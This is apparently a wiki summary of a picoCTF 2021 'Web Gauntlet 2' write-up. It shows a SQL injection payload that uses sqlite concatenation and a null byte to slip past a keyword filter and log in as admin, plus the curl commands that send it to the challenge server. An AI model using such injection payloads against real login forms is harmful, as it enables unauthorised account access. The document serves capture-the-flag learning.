---
title: Web Gauntlet 2 — picoCTF 2021 Web Exploitation writeup
created: 2026-06-24
updated: 2026-06-24
type: query
tags: [ctf, picoctf, picoctf2021, web-exploitation, writeup]
sources: [https://raw.githubusercontent.com/HHousen/PicoCTF-2021/master/Web%20Exploitation/Web%20Gauntlet%202/README.md]
confidence: medium
---

# Web Gauntlet 2 — picoCTF 2021 Web Exploitation writeup

## 참고 URL
- [공개 writeup / 원문](https://raw.githubusercontent.com/HHousen/PicoCTF-2021/master/Web%20Exploitation/Web%20Gauntlet%202/README.md)

## 핵심 요약
This website looks familiar... Log in as admin Site: <http://mercury.picoctf.net:35178/> Filter: <http://mercury.picoctf.net:35178/filter.php>

## 풀이 메모
1. According to filter.php the application filters the following: or and true false union like = > < ; -- /* */ admin.
2. The query that solves this is ad'||'min'%00, which is similar to the final payload in the "Web Gauntlet" challenge from the PicoCTF 2020 Mini competition. In sqlite the || operator concatenates strings, thus allowing us to bypass the filter for admin. Next, the %00 is a null byte, which terminates the SQL query.
3. A null byte cannot be typed directly into the website. So we use cURL instead: curl --data "user=ad'||'min'%00&pass=a" http://mercury.picoctf.net:35178/index.php --cookie "PHPSESSID=5ntoldq0gkiutgqkmkgfqbe5vb" --output -. I copied the PHPSESSID cookie from the browser, which is important because it is how the website knows to give us the flag when we go to /filter.php to get the flag.
4. We can retreive the flag with the browser that has the same PHPSESSID or wth curl: curl http://mercury.picoctf.net:35178/filter.php --cookie "PHPSESSID=5ntoldq0gkiutgqkmkgfqbe5vb" | grep picoCTF

## 같이 보면 좋은 페이지
- [[picoctf-2021-web-exploitation-survey]]
- [[picoctf-2021-web-exploitation-family-hub]]
- [[picoctf-2021-topic-map]]
